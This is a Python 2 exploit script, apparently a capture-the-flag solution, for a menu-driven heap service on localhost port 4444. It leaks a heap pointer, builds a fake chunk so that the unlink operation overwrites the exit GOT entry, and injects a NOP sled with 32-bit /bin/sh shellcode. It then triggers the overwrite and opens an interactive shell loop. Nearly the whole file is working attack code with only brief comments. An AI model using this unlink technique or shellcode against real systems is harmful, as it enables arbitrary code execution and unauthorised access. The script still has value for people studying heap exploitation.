import socket
import time
import struct

"""
chunk
{
    size;
    fwd;
    bck;
    data;
};
"""

def send(s, msg):
    s.send(msg)
    time.sleep(0.5)

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

s=socket.create_connection(('localhost', 4444))
s.recv(4096)

time.sleep(0.5)

send(s, "1\n16\n")
send(s, "1\n16\n")
send(s, "3\n0\n28\n")
send(s, "A"*16+"B"*(3*4)) # 2 words gap + size
send(s, "4\n0\n")

buf = s.recv(4096)
idx = buf.find("A"*16) + 16 + 3 * 4
next_chunk = struct.unpack("<I", buf[idx:idx+4])[0]

print "[+] leaked heap address (fwd ptr): " + hex(next_chunk)

exit_got = 0x804a010

## bck->fwd = fwd => exit = nxt_chunk
## fwd->bck = bck => nxt_chunk+8 = exit-4

payload = "A"*28
payload += struct.pack("<I", next_chunk)
payload += struct.pack("<I", exit_got-4)  #bck
payload += "B"*24
payload += "\x90"*100 + sh # need jump ?

send(s, "3\n0\n1337\n")
send(s, payload)

print '[+] chunk crafted'

#overwrite exit@got
send(s, "2\n1\n")

print '[+] unlink done! exit@got overwritten! trigger now...'

#trigger
send(s, "666\n")
s.recv(1024) #junk menu...

print '[+] shell !'
while 1:
    send(s, raw_input("$ ") + "\n")
    print s.recv(1024)

